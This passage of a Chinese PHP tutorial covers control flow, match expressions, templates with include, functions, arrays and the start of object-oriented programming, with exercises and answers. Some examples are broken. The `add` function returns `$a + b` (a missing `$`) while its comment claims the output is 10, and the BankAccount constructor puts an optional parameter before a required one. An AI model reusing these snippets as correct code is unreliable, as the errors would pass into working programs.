    echo "优秀";
} elseif ($score >= 80) {         // 注意是 elseif（elif 不存在）
    echo "良好";
} elseif ($score >= 60) {
    echo "及格";
} else {
    echo "不及格";
}
```

规则与 C/Java 相同：花括号成块、条件松散比较（记得用 `===`）。两件 PHP 特色：

**① 真值规则**（弱类型的另一面）——以下都当"假"：`0`、`0.0`、`""`、`"0"`、`[]`、`null`、`false`。所以 `if ($row)` 可以直接判断"数据库查到行没有"（第 9 章回收）；要区分"0 和没有"必须用 `===`。

**② 替代语法（alternative syntax）**——HTML 模板专用：花括号换成冒号 + `endif`/`endwhile`/`endforeach`，嵌在 HTML 里层次更清楚：

```php
<?php if ($isLogin): ?>
    <p>欢迎回来，<?= $username ?></p>
<?php else: ?>
    <a href="login.php">请登录</a>
<?php endif; ?>
```

顺带认识 `<?= ?>`——`echo` 的短标签（等于 `<?php echo ... ?>`），模板里输出一个值的标准姿势。

## 3.2 match 表达式（PHP 8）

传统 switch 的问题：忘 break 会贯穿、松散比较、语法啰嗦。**PHP 8 的 match 全部修复**（对照 Java 教程 switch 表达式）：

```php
<?php
$code = 404;

$message = match (true) {
    $code >= 500 => "服务器错误",
    $code >= 400 => "客户端错误",
    $code >= 200 => "成功",
    default      => "未知",
};
echo $message;                  // 客户端错误

// 常规形态：严格比较（===），无需 break，多值并列
$type = match ($ext) {
    "jpg", "png", "gif" => "图片",
    "mp4", "avi"        => "视频",
    default             => "其他",
};
```

要点：`=>` 分支、不贯穿、**严格比较**、是表达式可赋值、必须穷尽（没有 default 且不匹配会抛 `UnhandledMatchError`）。**新代码一律 match，老 switch 认识即可**（switch 语法与 C 完全相同，这里不重复）。

## 3.3 三种循环

```php
// while：先判断后执行
$i = 1;
while ($i <= 5) {
    echo $i++;
}

// do-while：至少执行一次（菜单场景）
do {
    $cmd = readline("> ");          // CLI 读一行输入
} while ($cmd !== "q");

// for：三要素一行写齐（Web 页分页渲染常用）
for ($i = 1; $i <= 9; $i++) {
    echo "第 $i 页 ";
}
```

`break` / `continue` 语义照旧，且支持**层数参数**（同 Java 标签的效果）：

```php
for ($i = 1; $i <= 3; $i++) {
    for ($j = 1; $j <= 3; $j++) {
        if ($i * $j > 4) break 2;       // 直接跳出两层
    }
}
```

### 传统 switch 与 goto：认识即可

match 之外，老 switch（与 C 语法一致）在存量代码里铺天盖地：

```php
switch ($cmd) {
    case "start":
        echo "启动";
        break;                    // 不 break 会贯穿到下个 case（对照 Java 教程同款坑）
    case "stop":
    case "exit":                  // 贯穿的"正面用法"：多值共用分支
        echo "停止";
        break;
    default:
        echo "未知命令";
}
```

三差异记住：switch 是**松散比较**（`==`）而 match 是严格比较；switch 语句无返回值（match 是表达式可赋值）；switch 不强制穷尽。**新代码 match，老代码会读**。至于 `goto`——PHP 确实有，合法用途仅限"跳出多层嵌套"，其余场景被全社区视为禁忌，知道它存在是为了读老代码时不震惊。

### 循环实战：数据表与分页导航

Web 循环的两大典型场景，先混个脸熟：

```php
<?php
$products = [
    ["name" => "键盘", "price" => 299],
    ["name" => "鼠标", "price" => 99],
    ["name" => "显示器", "price" => 1299],
];
?>
<table border="1">
    <tr><th>商品</th><th>价格</th></tr>
    <?php foreach ($products as $p): ?>
    <tr>
        <td><?= htmlspecialchars($p["name"]) ?></td>
        <td><?= number_format($p["price"], 2) ?> 元</td>
    </tr>
    <?php endforeach; ?>
</table>

<?php
// 分页导航：1 2 3 ... 10（for 生成页码）
$totalPages = 10;
$currentPage = 4;
for ($p = 1; $p <= $totalPages; $p++) {
    if ($p === $currentPage) {
        echo "<strong>{$p}</strong> ";
    } else {
        echo "<a href='?page={$p}'>{$p}</a> ";
    }
}
?>
```

表格循环（foreach + 替代语法 + 转义输出）与分页循环（for + 条件样式）是列表页的标准零件，第 11 章留言板直接复用。

## 3.4 foreach：数组遍历的主力（先见后详）

PHP 的 for-in 等价物叫 **foreach**（第 4 章数组的主舞台）：

```php
$fruits = ["苹果", "香蕉", "橘子"];

foreach ($fruits as $fruit) {              // 只要值
    echo "$fruit ";
}

foreach ($fruits as $i => $fruit) {        // 要键（下标）和值
    echo "$i: $fruit ";
}

$ages = ["张三" => 19, "李四" => 20];       // 关联数组（字典）
foreach ($ages as $name => $age) {
    echo "$name $age 岁 ";
}
```

`as $key => $value` 的双变量形态是 PHP 遍历关联数组的标准写法，第 4 章展开数组本体。

## 3.5 模板实战：一张带逻辑的成绩单

把本章全部语法塞进一个真实页面——**HTML 与 PHP 交替**是 PHP 网页的标准长相：

```php
<?php
// report.php
$students = [
    ["name" => "张三", "score" => 90],
    ["name" => "李四", "score" => 66],
    ["name" => "王五", "score" => 45],
];

function grade(int $s): string {
    return match (true) {
        $s >= 90 => "优秀",
        $s >= 80 => "良好",
        $s >= 60 => "及格",
        default  => "不及格",
    };
}

$total = 0;
foreach ($students as $stu) $total += $stu["score"];
$avg = count($students) ? $total / count($students) : 0;
?>
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>成绩单</title></head>
<body>
    <h1>成绩单</h1>
    <table border="1" cellpadding="4">
        <tr><th>姓名</th><th>成绩</th><th>等级</th></tr>
        <?php foreach ($students as $stu): ?>
        <tr>
            <td><?= htmlspecialchars($stu["name"]) ?></td>
            <td><?= $stu["score"] ?></td>
            <td><?= grade($stu["score"]) ?></td>
        </tr>
        <?php endforeach; ?>
    </table>
    <p>平均分：<?= number_format($avg, 2) ?></p>
    <?php if ($avg >= 60): ?>
        <p style="color:green">班级及格</p>
    <?php else: ?>
        <p style="color:red">班级不及格</p>
    <?php endif; ?>
</body>
</html>
```

结构解读：**顶部 `<?php ?>` 块准备数据与函数 → HTML 用替代语法循环渲染**——数据与展示分离的雏形（第 11 章项目正式演化为 MVC-lite）。`htmlspecialchars()` 负责转义输出防 XSS（第 10 章主角，**现在就养成"输出 HTML 前必转义"的习惯**）。

### 综合练习级示例：文本日历页

控制流全家桶组装——输出指定年月的日历表（for/while/match/函数各司其职）：

```php
<?php
// calendar.php?y=2026&m=11
$y = max(1970, min(2100, (int)($_GET["y"] ?? date("Y"))));   // 边界钳制
$m = max(1, min(12, (int)($_GET["m"] ?? date("n"))));

$firstDay = (int)date("w", mktime(0, 0, 0, $m, 1, $y));      // 1 号是星期几（0=周日）
$daysInMonth = (int)date("t", mktime(0, 0, 0, $m, 1, $y));   // 当月天数

$season = match (true) {
    in_array($m, [3, 4, 5])  => "春",
    in_array($m, [6, 7, 8])  => "夏",
    in_array($m, [9, 10, 11]) => "秋",
    default                   => "冬",
};
?>
<h1><?= $y ?> 年 <?= $m ?> 月（<?= $season ?>）</h1>
<table border="1" cellpadding="6">
    <tr><th>日</th><th>一</th><th>二</th><th>三</th><th>四</th><th>五</th><th>六</th></tr>
    <tr>
    <?php for ($i = 0; $i < $firstDay; $i++): ?>
        <td></td><?php endfor; ?>
    <?php for ($d = 1; $d <= $daysInMonth; $d++): $w = ($firstDay + $d - 1) % 7; ?>
        <td<?= $w === 0 || $w === 6 ? ' style="color:red"' : '' ?>><?= $d ?></td>
    <?php if ($w === 6): ?></tr><tr><?php endif; ?>
    <?php endfor; ?>
    </tr>
</table>
<p>
    <a href="?y=<?= $m === 1 ? $y - 1 : $y ?>&m=<?= $m === 1 ? 12 : $m - 1 ?>">◀ 上月</a> |
    <a href="?y=<?= $m === 12 ? $y + 1 : $y ?>&m=<?= $m === 12 ? 1 : $m + 1 ?>">下月 ▶</a>
</p>
```

设计要点：**输入钳制**（min/max 把非法月份压回合法域，防御性编程的日常）；`date("t")` 拿当月天数（不自己算闰年）；**星期换算**取模渲染（周末红字）；上/下月链接的年月跨界处理（三元表达式）。这类"查询 + 渲染"的页面结构与第 11 章留言板列表页完全同构——控制流学完，Web 页面的骨架你已经会了。

### include 拆分：页头页尾与"模板拼装"

每个页面重复写 `<!DOCTYPE html>`？用 include 把公共部分拆出去（MVC-lite 的第一步雏形）：

```php
<?php
// header.php —— 全站页头（含会话启动，因为它在所有输出之前！）
session_start();
$user = $_SESSION["user_id"] ?? null;
?>
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title><?= $pageTitle ?? "我的站" ?></title></head>
<body>
<nav>
    <a href="index.php">首页</a>
    <?php if ($user): ?>
        <a href="logout.php">登出</a>
    <?php else: ?>
        <a href="login.php">登录</a>
    <?php endif; ?>
</nav>
```

```php
<?php
// footer.php —— 页尾
?>
<footer><small>© 2026 我的站</small></footer>
</body></html>
```

```php
<?php
// index.php —— 业务页：变量先行，模板殿后
$pageTitle = "首页";                    // 传给 header.php 的变量（include 共享作用域）
require "header.php";
?>
<h1>欢迎</h1>
<p>今天的内容……</p>
<?php require "footer.php"; ?>
```

两件关键事：**① include 共享变量作用域**（业务页顶部的 `$pageTitle` 在 header.php 里直接可见——所以"先设变量再 include"的顺序是铁律）；**② session_start 必须在任何输出前**——放进 header.php 顶部正好满足（它先于 HTML 输出执行）。这个"变量先行 + header/footer 拼装"的朴素结构，到第 11 章 layout.php 插槽版只是换了语法，思想一脉相承。

## 3.6 小结

- elseif（不是 elif）；真值规则（0/""/"0"/[]/null 为假）；替代语法 if: endif 用于模板；
- match：严格比较、不贯穿、表达式、须穷尽——新代码首选；
- foreach 两种形态（值 / 键=>值）；break 2 可跳多层；
- `<?= ?>` 短输出；模板 = HTML + 数据准备块 + 替代语法循环；
- 输出用户数据前 `htmlspecialchars()`——从第一个页面开始的安全习惯。

## 练习 3

1.（概念）传统 switch 忘 break 会怎样？match 会吗？match 的比较用什么运算符？
2.（编程）输出九九乘法表（HTML `<br>` 换行版）。
3.（编程）用 match(true) 把月份 3~5 春、6~8 夏、9~11 秋、12~2 冬映射成季节。
4.（编程）渲染一张"倒计时表"：for 循环从 10 倒数到 1，每个数字一行，5 以下加红色样式（内联 style）。
5.（编程）把 3.5 节成绩单加一列"是否及格"（>=60 显示 ✓ 否则 ✗）。

## 参考答案

**1.** switch 贯穿执行后续分支；match 每个分支独立不贯穿；match 用严格比较 `===`。

**2.**

```php
<?php for ($i = 1; $i <= 9; $i++): ?>
    <?php for ($j = 1; $j <= $i; $j++): ?>
        <?= $j ?>×<?= $i ?>=<?= $i * $j ?>&nbsp;&nbsp;
    <?php endfor; ?>
    <br>
<?php endfor; ?>
```

**3.**

```php
$season = match (true) {
    in_array($m, [3, 4, 5])   => "春",
    in_array($m, [6, 7, 8])   => "夏",
    in_array($m, [9, 10, 11]) => "秋",
    default                   => "冬",
};
```

**4.**

```php
<?php for ($i = 10; $i >= 1; $i--): ?>
    <div<?= $i < 5 ? ' style="color:red"' : '' ?>>倒计时：<?= $i ?></div>
<?php endfor; ?>
```

**5.** 表头加 `<th>及格</th>`，行内加：

```php
<td><?= $stu["score"] >= 60 ? "✓" : "✗" ?></td>
```

**[▲ 返回目录](#toc)**

---

<a id="h04"></a>

# 第 4 章 函数与数组

> 本章目标：函数定义与类型声明、引用传参、可变函数；**PHP 数组 = 列表 + 字典一体**（本章主角）；常用数组函数全家桶；超全局变量初见。数组是 PHP 的第一数据结构——Web 开发里"一行数据库查询"的返回就是数组。

---

## 4.1 函数

```php
<?php
declare(strict_types=1);          // 严格类型模式（现代项目标配，放文件首行）

function add(int $a, int $b): int {
    return $a + b;
}
echo add(3, 7);                   // 10

function greet(string $name, string $greeting = "你好"): string {   // 默认参数
    return "$greeting，$name！";
}
echo greet("张三");                // 你好，张三！
echo greet("李四", "早上好");       // 命名参数（PHP 8+）：greet(name: "李四", greeting: "晚安") 顺序随意

function divide(int $a, int $b): float|int {
    if ($b === 0) {
        throw new InvalidArgumentException("除数不能为 0");   // 异常（第 10 章体系化）
    }
    return $a / $b;
}

// 无返回值：void
function logLine(string $msg): void {
    echo "[LOG] $msg\n";
}

// 可变参数 ...$nums（收进数组，同 Python *args）
function sum(int ...$nums): int {
    return array_sum($nums);
}
echo sum(1, 2, 3, 4);             // 10
```

要点：

- **类型声明 + strict_types** 是现代规范（对照 Java 强类型、Python 注解）；联合类型 `float|int`、可空类型 `?string`（= `string|null`）都是 PHP 8 原生语法；
- **命名参数**（8.0+）：`greet(greeting: "晚安", name: "李四")`——跳过默认参数、顺序自由，读起来像文档；
- 函数内默认**看不到外部变量**（与 Python 不同）——要访问全局需 `global $x;` 或超全局（4.4 节天然全局），更好的做法是参数传入；
- **函数是一等公民**：函数名可以当字符串传给别的函数（`call_user_func`、可变函数 `$f()`），第 4.3 节 usort 回收。

## 4.2 数组：列表与字典的一体两面

**PHP 只有一种数组类型，它同时是列表和字典**（哈希表实现，有序）：

```php
<?php
// 索引数组（列表）：键自动 0,1,2...
$fruits = ["苹果", "香蕉", "橘子"];
echo $fruits[0];                    // 苹果
$fruits[] = "葡萄";                  // 尾部追加

// 关联数组（字典）：自定义字符串键
$student = [
    "name"  => "张三",
    "age"   => 19,
    "score" => 90,
];
echo $student["name"];              // 张三
$student["grade"] = "高三";          // 增/改
unset($student["age"]);             // 删

// 混合与嵌套（Web 数据的常态）
$class = [
    "teacher" => "王老师",
    "students" => [
        ["name" => "张三", "score" => 90],
        ["name" => "李四", "score" => 66],
    ],
];
echo $class["students"][0]["name"];           // 张三 —— 链式下标
echo $class["students"][1]["score"];          // 66
```

**三种遍历**：

```php
foreach ($fruits as $f) { ... }                       // 索引数组：只要值
foreach ($student as $key => $value) { ... }          // 关联：键值都要
for ($i = 0; $i < count($fruits); $i++) { ... }       // 传统 for（要下标运算时）

// 引用遍历：改原数组（& 引用符号，谨慎用）
foreach ($student as $k => &$v) { $v = strtoupper((string)$v); }
unset($v);                                            // 用完立刻断开引用（经典坑）
```

**list 解包**（对照 Python 元组解包）：

```php
[$name, $score] = ["张三", 90];         // 一行拆两个
["name" => $n, "age" => $a] = $student; // 关联数组按键解包
foreach ($class["students"] as ["name" => $n, "score" => $s]) {
    echo "$n: $s\n";
}
```

### 键的规则与常见坑

- 省略键时 PHP 用"当前最大整数键 + 1"（`[5 => "a", "b"]` 的 "b" 键是 6）；
- 字符串数字键 `"5"` 会转成 int 5（自动规范化）；
- **`isset($arr["k"])` 判断键存在且非 null**（比 `array_key_exists` 更常用，后者连 null 键都算存在）；
- `unset` 后索引数组**不会重排**（`[0,1,2]` 删掉 1 后剩 `[0,2]`）——需要重排用 `array_values($arr)`。

## 4.3 数组函数全家桶（高频 20 个）

```php
$nums = [5, 2, 9, 1, 7];

count($nums);                     // 5
sort($nums);                      // 原地升序 [1,2,5,7,9]；rsort 降序
asort($ages);                     // 按值排序并保留键（关联数组用）；arsort 降序
ksort($ages);                     // 按键排序
in_array(9, $nums);               // true（成员判断）
array_search(9, $nums);           // 找值返回键，找不到 false
array_keys($student);             // ['name','score']；array_values 取全部值
array_push($nums, 10, 11);        // 尾部追加（= $nums[] = 10）；array_pop 弹出
array_merge($a, $b);              // 合并（数字键重排；字符串键后者覆盖）
[...$a, ...$b]                    // 展开合并（PHP 7.4+ 字面量写法）
array_slice($nums, 1, 3);         // 切片 [下标1 起 3 个]
array_reverse($nums);             // 反转
array_sum($nums);                 // 求和；array_product 乘积
array_unique($nums);              // 去重（保留键）
implode(",", $nums);              // 拼字符串（第 2 章）
explode(",", "a,b,c");            // 拆数组
array_combine($keys, $values);    // 键数组+值数组 → 关联数组

// 三大回调函数（函数当参数！）
$names = array_map(fn($s) => $s["name"], $class["students"]);   // ['张三','李四'] 变换
$fails = array_filter($class["students"], fn($s) => $s["score"] < 60);  // 过滤
$total = array_reduce($class["students"], fn($carry, $s) => $carry + $s["score"], 0);  // 聚合

// usort：自定义排序（太空船运算符的舞台）
usort($class["students"], fn($a, $b) => $b["score"] <=> $a["score"]);   // 按分数降序
```

`fn($x) => 表达式` 是 **箭头函数**（PHP 7.4+，自动捕获外部变量，单表达式）——PHP 版 lambda（对照 Java lambda、Python lambda）。`array_map/filter/reduce + fn` 三连是数据加工的标准姿势；`<=>`（太空船）返回 -1/0/1 专为排序设计。

`list($a, $b) = ...` 与解包、`compact/extract` 等老函数认识即可。

### array_column 与"列视角"：从行集里抽列

Web 开发的高频形态是"一堆行"（数据库查回来的行集），两个函数专治行集加工：

```php
$rows = [
    ["id" => 7,  "name" => "张三", "score" => 90],
    ["id" => 12, "name" => "李四", "score" => 66],
    ["id" => 19, "name" => "王五", "score" => 95],
];

array_column($rows, "name");              // ['张三','李四','王五'] —— 抽出一列
array_column($rows, null, "id");          // 按 id 重建索引的关联数组！
// [7 => [...], 12 => [...], 19 => [...]]
// 之后 $byId[12]["name"] 直接 O(1) 命中 —— 不用循环查找
array_column($rows, "score", "name");     // ['张三'=>90, '李四'=>66, '王五'=>95]
```

`array_column($rows, null, "id")` 是"行集转字典"的神器：配合 `isset($byId[$id])` 判断、直接取值，替代手写 foreach 查找（O(n) → O(1)，对照 Python 教程 dict 哈希直达的同款原理）。组合拳：

```php
// “每个学生的名字:分数”映射
$byId = array_column($rows, null, "id");
foreach ([7, 19] as $id) {
    echo $byId[$id]["name"], " ";
}                                          // 张三 王五
```

### usort 排序家族详解

| 函数              | 排什么         | 保持键？             |
| ----------------- | -------------- | -------------------- |
| `sort/rsort`      | 值             | ✗（重排成 0,1,2...） |
| `asort/arsort`    | 值             | ✓                    |
| `ksort/krsort`    | 键             | ✓                    |
| `usort`           | 值，自定义比较 | ✗                    |
| `uasort`          | 值，自定义比较 | ✓                    |
| `array_multisort` | 多列（老式）   | 视参数               |

判定法两问：**① 关联数组吗？**（是→asort/uasort 家族）**② 比较规则自定义吗？**（是→u 家族）。自定义比较函数返回"负/零/正"表示"小于/等于/大于"：

```php
usort($rows, fn($a, $b) => $b["score"] <=> $a["score"] ?: $a["name"] <=> $b["name"]);
// ?: 的短路：分数相等（0）时才比较名字 —— 多字段排序一行写完
```

（对照 Java Comparator、Python sorted key、C qsort 比较函数——四种语言的排序思想完全一致，只有语法差异。）

### 数组的差集、交集与"集合运算"三函数

数组的集合运算三函数（对照 Python 的 `& | -`、Java 的 Set）：

```php
$a = ["php", "js", "go"];
$b = ["js", "rust"];

array_diff($a, $b);       // ['php', 'go']   差集：a 有 b 没有（按值）
array_intersect($a, $b);  // ['js']          交集：两边都有
array_merge($a, $b);      // 并集（值重复保留）——真去重并集：array_unique(array_merge(...))

// 键视角变体：array_diff_key（键差集）、array_diff_assoc（键值都比）——严格比对用 assoc 系
$same = array_diff_assoc($expected, $actual);   // 单元测试式“哪里不一样”排查神器
```

**实战场景**——"数据同步"类需求全靠它们：数据库旧数组 vs 新提交数组的对比，得出"该新增的、该删除的、该保留的"：

```php
$oldIds = [1, 2, 3];                        // 库里现有的
$newIds = [2, 3, 9];                        // 用户提交的
$toDelete = array_diff($oldIds, $newIds);   // [1] —— 删掉
$toInsert = array_diff($newIds, $oldIds);   // [9] —— 新增
$keep      = array_intersect($oldIds, $newIds);  // [2,3] —— 不动
```

一集合题三行解，不需要手写循环比对（对照第 5 章 Python set 运算、Java Set——集合思维是通用能力）。`array_diff` 比较的是**值**（松散比较）——严格比较用 `array_diff` 前先 `array_map('strval', ...)` 统一类型，或改用带回调的变体。

## 4.4 超全局变量：请求信息的入口

PHP 有一批**在任何作用域都可见**的内置数组（超全局），它们是"HTTP 请求世界"的入口——第 7 章的主角，先见面：

| 超全局                   | 内容             | 例                              |
| ------------------------ | ---------------- | ------------------------------- |
| `$_GET`                  | URL 查询参数     | `page.php?id=5` → `$_GET["id"]` |
| `$_POST`                 | 表单 POST 数据   | 第 7 章                         |
| `$_COOKIE` / `$_SESSION` | Cookie / 会话    | 第 8 章                         |
| `$_SERVER`               | 服务器与请求信息 | `$_SERVER["REQUEST_METHOD"]`    |
| `$_FILES`                | 上传的文件       | 第 7 章延伸                     |
| `$GLOBALS`               | 全部全局变量     | 少用                            |

```php
// page.php?id=5&sort=desc
echo $_GET["id"];                  // '5'（注意：超全局的值全是字符串！）
$page = (int)($_GET["page"] ?? 1); // 标准读取三件套：强转 + ?? 默认值（第 2 章）
echo $_SERVER["REQUEST_METHOD"];   // GET
print_r($_SERVER);                 // dump 整个数组看看有什么
```

`print_r()` 与 `var_dump()`：前者人读友好、后者类型精确——调试数组的两把刷子。

### 数组当栈与队列：端点操作四函数

PHP 数组的端点操作覆盖栈（LIFO）与队列（FIFO）两种抽象：

```php
$stack = [];
array_push($stack, "a", "b");      // 压栈（尾部入）等价 $stack[] = "a"
array_push($stack, "c");
echo array_pop($stack);             // 'c'（尾部出）—— 后进先出 = 栈

$queue = [];
array_unshift($queue, "任务1");     // 头部入
array_unshift($queue, "任务2");
echo array_shift($queue);           // '任务1'（头部出）—— 先进先出 = 队列
```

`array_pop/shift` 返回被移除的元素（`shift` 还会重排索引数组）；`array_shift` 在大数组上是 O(n)（全部前移），高并发任务队列应换 Redis/数据库（对照 Python 教程 deque 的 O(1)）。递归处理树状数据（目录、评论树）时栈思维随时出现——**数据结构不是课程，是你马上要用的工具**。

### 匿名函数与 use 捕获：闭包的 PHP 版

PHP 匿名函数（5.3+）需要**显式声明捕获外部变量**（对照 Python 闭包的自动捕获）：

```php
$multiplier = 3;

$times = function (int $n) use ($multiplier): int {     // use 声明要捕获的变量
    return $n * $multiplier;
};
echo $times(5);                    // 15

// 引用捕获：闭包内修改外部变量（计数器模式）
$counter = 0;
$inc = function () use (&$counter): void {              // & 引用捕获
    $counter++;
};
$inc(); $inc();
echo $counter;                     // 2

// 箭头函数 fn（7.4+）：自动按值捕获，单表达式——现代首选
$squared = fn(int $n): int => $n * $n;
```

对照表：`function() use ($x)` ≈ Python 的默认参数捕获；`fn() =>` ≈ Python lambda（但带类型声明）；`use (&$x)` ≈ Python nonlocal 的场景。4.3 节的 array_map/filter/usort 在老代码里全是 `function() use (...)` 形态——**两种写法都要会读，新代码统一 fn**。

### 多维数组实战：行集加工三式

数据库行集（第 9 章 fetchAll 的返回）是二维数组的常客，三个高频加工式：

```php
$rows = [
    ["id" => 1, "dept" => "技术", "score" => 90, "name" => "张三"],
    ["id" => 2, "dept" => "技术", "score" => 66, "name" => "李四"],
    ["id" => 3, "dept" => "市场", "score" => 95, "name" => "王五"],
];

// 式一：按列分组（分组统计的前半场）
$byDept = [];
foreach ($rows as $r) {
    $byDept[$r["dept"]][] = $r;              // 键不存在自动创建数组并追加
}
// ['技术' => [张三, 李四], '市场' => [王五]]

// 式二：分组聚合（后半场）—— 每部门平均分
foreach ($byDept as $dept => $people) {
    $avg = array_sum(array_column($people, "score")) / count($people);
    echo "$dept: $avg\n";                     // 技术: 78  市场: 95
}

// 式三：多字段排序（先部门升序、同部门分数降序）—— usort 组合比较
usort($rows, fn($a, $b) =>
    [$a["dept"], -$a["score"]] <=> [$b["dept"], -$b["score"]]
);
// 数组 <=> 数组：逐元素比较——一行完成多键排序（PHP 特色糖）
```

`array_column` 抽列、`[]=` 分组追加、`array <=> array` 多键比较——三式覆盖行集加工的九成需求。对照 Java 教程 Stream 的 groupingBy、Python 教程 defaultdict 分组：**同一道题的多国语言版本**，你已经集齐了。

## 4.5 小结

- 类型声明 + strict_types；默认参数、命名参数、...可变参数；
- **一种数组两种用法**：索引/关联；链式下标穿嵌套；isset 判存在；unset 不重排；
- 数组函数 20 个 + map/filter/reduce/usort 四大回调 + 箭头函数 fn；
- 超全局是请求世界的入口（`??` + 强转读取）；var_dump/print_r 调试。

## 练习 4

1.（概念）`sort()` 与 `asort()` 的区别？什么数组必须用后者？
2.（概念）`$a = [3 => "x", "y"];` 中 "y" 的键是什么？为什么？
3.（编程）给定 `$students = [["name"=>"张三","score"=>90], ["name"=>"李四","score"=>66], ["name"=>"王五","score"=>95]]`：用 usort 按分数降序、array_map 取出全部姓名、array_filter 留下及格者、array_reduce 求平均分。
4.（编程）用 foreach 渲染 HTML `<select>` 下拉框：选项来自 `$cities = ["bj"=>"北京","sh"=>"上海","gz"=>"广州"]`（value 为键、显示为值）。
5.（编程）写函数 `stats(array $nums): array` 返回 `["min"=>.., "max"=>.., "avg"=>..]`（avg 保留 2 位）。

## 参考答案

**1.** sort 重排后**键变成 0,1,2...**；asort 保持键值关联只调顺序。关联数组（键有业务含义）必须 asort/ksort，否则键信息全丢。

**2.** 键是 **4**——省略键时取"当前最大整数键 + 1"（3 + 1）。

**3.**

```php
usort($students, fn($a, $b) => $b["score"] <=> $a["score"]);
$names = array_map(fn($s) => $s["name"], $students);
$pass  = array_filter($students, fn($s) => $s["score"] >= 60);
$avg   = array_reduce($students, fn($c, $s) => $c + $s["score"], 0) / count($students);
```

**4.**

```php
echo '<select name="city">';
foreach ($cities as $code => $label) {
    echo "<option value=\"$code\">$label</option>";
}
echo '</select>';
```

**5.**

```php
function stats(array $nums): array {
    return [
        "min" => min($nums),
        "max" => max($nums),
        "avg" => round(array_sum($nums) / count($nums), 2),
    ];
}
```

**[▲ 返回目录](#toc)**

---

<a id="h05"></a>

# 第 5 章 面向对象

> 本章目标：类与对象、属性/方法类型声明、构造器属性提升（PHP 8 招牌语法）、继承与抽象类、接口、Traits、魔术方法。PHP 的 OOP 形态接近 Java（强类型声明），语法更紧凑。

---

## 5.1 类与对象：从数组到对象

第 4 章用关联数组描述学生——字段没有类型保护、没有行为、拼错键名不报错。**对象 = 有类型契约的数据 + 方法**：

```php
<?php
declare(strict_types=1);

class Student
{
    public string $name;             // 属性：可见性 + 类型声明
    public int $score;

    public function __construct(string $name, int $score)
    {
        $this->name = $name;         // $this = 当前实例；箭头 -> 访问成员
        $this->score = $score;
    }

    public function introduce(): string          // 方法：可见性 + 返回类型
    {
        return "{$this->name}（{$this->score} 分）";
    }
}

$s1 = new Student("张三", 90);       // 实例化：new 类名(参数)
echo $s1->name;                      // 张三（对象成员用 ->，不是数组 []）
echo $s1->introduce();               // 张三（90 分）
var_dump($s1 instanceof Student);    // true：类型判断
```

三件套语法（对照 Java 教程第 5 章）：`public` 可见性、`$this->成员`、`->` 箭头。静态成员也同款：`public static int $count = 0;`、`Student::$count++`（双冒号 `::` 访问静态）、`static::` / `self::`。

### 构造器属性提升（PHP 8 招牌）

上面 6 行的"声明属性 + 构造器赋值"是纯仪式，PHP 8 的**提升**一步到位：

```php
class Student
{
    public function __construct(
        public string $name,          // 声明+类型+赋值 三合一
        private int $score,           // 顺手还能声明成 private
    ) {}

    public function introduce(): string
    {
        return "{$this->name}（{$this->score} 分）";
    }
}
```

参数加可见性修饰符即"提升为属性"——**Java record 的 PHP 兄弟**（少 readonly 关键字，8.1+ 可加）。现代 PHP 项目里你看到的类几乎都长这样。

## 5.2 可见性与封装

四档与 Java 相同：`public`（谁都能碰）/ `protected`（本类+子类）/ `private`（仅本类）/ PHP 8.1 的 `readonly`（初始化后不可改）。getter/setter 或 `@property` 惯例照旧：

```php
class BankAccount
{
    public function __construct(
        private float $balance = 0,
        private readonly string $owner,       // 只读：构造后锁死
    ) {}

    public function deposit(float $amount): void
    {
        if ($amount <= 0) {
            throw new InvalidArgumentException("存款必须为正数");
        }
        $this->balance += $amount;
    }

    public function withdraw(float $amount): void
    {
        if ($amount > $this->balance) {
            throw new DomainException("余额不足");
        }
        $this->balance -= $amount;
    }

    public function getBalance(): float
    {
        return $this->balance;
    }
}

$acc = new BankAccount(owner: "张三");
$acc->deposit(1000);
$acc->withdraw(300);
echo $acc->getBalance();          // 700
// $acc->balance = -999;          // fatal：private 挡住脏数据
```

封装思想与 Java 教程完全一致（数据过方法守门）；PHP 8.1 的 `readonly` 让"不可变数据对象"一行实现。

## 5.3 继承与抽象类

```php
abstract class Shape
{
    public function __construct(protected string $name) {}   // protected：子类可见

    abstract public function area(): float;                  // 抽象方法：子类必须实现

    public function report(): string                         // 普通方法照常实现
    {
        return sprintf("%s 面积 %.2f", $this->name, $this->area());
    }
}

class Circle extends Shape                    // extends 单继承
{
    public function __construct(private float $r)
    {
        parent::__construct("圆");            // parent:: 调父类（= Java 的 super）
    }

    public function area(): float
    {
        return M_PI * $this->r ** 2;
    }
}

class Rect extends Shape
{
    public function __construct(private float $w, private float $h)
    {
        parent::__construct("矩形");
    }

    public function area(): float
    {
        return $this->w * $this->h;
    }
}

$shapes = [new Circle(2), new Rect(3, 4)];
foreach ($shapes as $s) {
    echo $s->report(), "\n";                  // 多态：各调各的 area()
}
```

与 Java 同款：单继承、抽象类不能实例化、抽象方法逼子类实现、多态动态绑定。`parent::__construct(...)` 必须显式调（PHP 不自动调父类构造器——与 Java 不同！）；`final class`/`final public function` 禁止继承/重写也同 Java。

## 5.4 接口：能力合同

```php
interface JsonSerializable2
{
    public function toArray(): array;
}

interface Renderable
{
    public function render(): string;
}

// 类可以 implements 多个接口（多继承的正规解法，同 Java）
class Article implements JsonSerializable2, Renderable
{
    public function __construct(
        public readonly string $title,
        private string $body,
    ) {}

    public function toArray(): array
    {
        return ["title" => $this->title, "body" => $this->body];
    }

    public function render(): string
    {
        return "<h1>{$this->title}</h1><p>{$this->body}</p>";
    }
}

function printJson(JsonSerializable2 $item): void     // 类型声明为接口：按合同收货
{
    echo json_encode($item->toArray(), JSON_UNESCAPED_UNICODE);
}

printJson(new Article("PHP 8", "现代、简洁、快速"));
```

接口成员默认 public、可含常量；PHP 8 接口也能有默认实现（类似 Java default 方法）。**面向接口编程**守则照旧：函数参数声明接口类型、实现随便换。

顺带认识 **匿名类**（`new class { ... }`，一次性实现接口用）与 **枚举 enum**（PHP 8.1+，带方法的常量类，形态与 Java/Python 版几乎一致，用时查阅即可）。

## 5.5 Traits：横向复用

接口管"会什么"（无实现），继承管"是谁"（单线），**Trait 管"顺带会一招"**——横向塞进任何类的方法包：

```php
trait Loggable
{
    protected array $logs = [];

    public function log(string $msg): void
    {
        $this->logs[] = date("H:i:s") . " " . $msg;
    }

    public function dumpLogs(): array
    {
        return $this->logs;
    }
}

trait Sluggable
{
    public function slug(): string
    {
        return strtolower(str_replace(" ", "-", $this->title ?? ""));
    }
}

class Article
{
    use Loggable, Sluggable;                 // 横向组合多招

    public function __construct(public string $title) {}
}

